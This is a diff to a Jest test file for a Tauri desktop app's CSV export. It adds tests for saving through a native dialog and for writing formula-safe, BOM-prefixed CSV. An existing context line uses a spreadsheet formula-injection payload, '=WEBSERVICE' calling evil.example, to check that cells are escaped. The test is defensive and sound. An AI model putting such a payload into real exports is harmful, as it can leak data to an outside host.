@@ -13,15 +13,22 @@ jest.mock("@/lib/tauri/commands", () => ({
   moreTokenRemoveInstance: jest.fn(),
   moreTokenRequest: jest.fn(),
   moreTokenSaveInstance: jest.fn(),
+  writeTextFile: jest.fn(),
 }))
+jest.mock("@/lib/tauri", () => ({ isTauri: jest.fn(() => false) }))
+jest.mock("@/lib/tauri/dialog", () => ({ pickSavePath: jest.fn() }))
 
-import { moreTokenRequest } from "@/lib/tauri/commands"
+import { isTauri } from "@/lib/tauri"
+import { moreTokenRequest, writeTextFile } from "@/lib/tauri/commands"
+import { pickSavePath } from "@/lib/tauri/dialog"
 import {
   createMemoryMoreTokenPort,
   hasInjectedMoreTokenPort,
   setMoreTokenPortForTests,
 } from "./port"
 import {
+  csvText,
+  downloadCsv,
   escapeCsvCell,
   ManagementApiError,
   managementRequest,
@@ -64,6 +71,30 @@ it("blocks spreadsheet formulas in CSV exports", () => {
     '"\'=WEBSERVICE(""https://evil.example"")"'
   )
   expect(escapeCsvCell("safe")).toBe("safe")
+})
+
+it("saves CSV through the native dialog on desktop, where a blob download does nothing", async () => {
+  ;(isTauri as jest.Mock).mockReturnValue(true)
+  ;(pickSavePath as jest.Mock).mockResolvedValueOnce("/tmp/ledger.csv")
+  await expect(downloadCsv("ledger.csv", [["id"], [1]])).resolves.toEqual({
+    kind: "saved",
+    path: "/tmp/ledger.csv",
+  })
+  expect(writeTextFile).toHaveBeenCalledWith("/tmp/ledger.csv", csvText([["id"], [1]]))
+
+  ;(pickSavePath as jest.Mock).mockResolvedValueOnce(null)
+  await expect(downloadCsv("ledger.csv", [["id"]])).resolves.toEqual({ kind: "cancelled" })
+  expect(writeTextFile).toHaveBeenCalledTimes(1)
+  ;(isTauri as jest.Mock).mockReturnValue(false)
+})
+
+it("writes a BOM-prefixed body with formula-safe cells", () => {
+  expect(
+    csvText([
+      ["a", "=1+1"],
+      [2, "x,y"],
+    ])
+  ).toBe('\ufeffa,\'=1+1\n2,"x,y"')
 })
 
 it("only opens same-origin absolute server paths", () => {
